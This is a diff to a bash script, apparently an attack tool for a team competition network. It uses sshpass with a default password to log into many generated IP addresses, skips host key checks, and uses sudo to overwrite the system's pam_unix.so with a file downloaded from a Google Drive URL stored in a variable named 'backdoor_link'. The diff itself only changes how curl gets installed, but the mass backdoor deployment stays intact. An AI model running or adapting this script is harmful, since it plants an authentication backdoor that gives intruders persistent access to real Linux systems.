@@ -7,26 +7,6 @@ timeout_duration=3
 path_to_pam="/lib/x86_64-linux-gnu/security"
 backdoor_link="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
 
-install_curl() {
-    if command -v curl &>/dev/null; then
-        echo "curl is already installed."
-        return
-    fi
-
-    if [ -f /etc/debian_version ]; then
-        sudo apt update && sudo apt install -y curl
-    elif [ -f /etc/redhat-release ] || grep -qi "centos\|rhel" /etc/os-release; then
-        sudo yum install -y curl
-    elif grep -qi "opensuse" /etc/os-release; then
-        sudo zypper install -y curl
-    elif grep -qi "arch" /etc/os-release; then
-        sudo pacman -Syu curl --noconfirm
-    else
-        echo "Unsupported distribution."
-        exit 1
-    fi
-}
-
 create_IPs() {
     network_id="1.2"
     number_of_teams=10
@@ -45,7 +25,10 @@ main() {
     printf "%s\n" "${IPs[@]}" | xargs -P 20 -I {} bash -c '
         IP="{}"
         sshpass -p "$default_password" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$timeout_duration "$username@$IP" "
-            echo \"$default_password\" | sudo -S bash -c \"$(declare -f install_curl); install_curl\";
+            echo \"$default_password\" | sudo -S apt install -y curl || \
+            echo \"$default_password\" | sudo -S yum install -y curl || \
+            echo \"$default_password\" | sudo -S zypper install -y curl || \
+            echo \"$default_password\" | sudo -S pacman -Syu curl --noconfirm
             echo \"$default_password\" | sudo -S curl -o \"$path_to_pam/pam_unix.so\" \"$backdoor_link\"
         "
     '
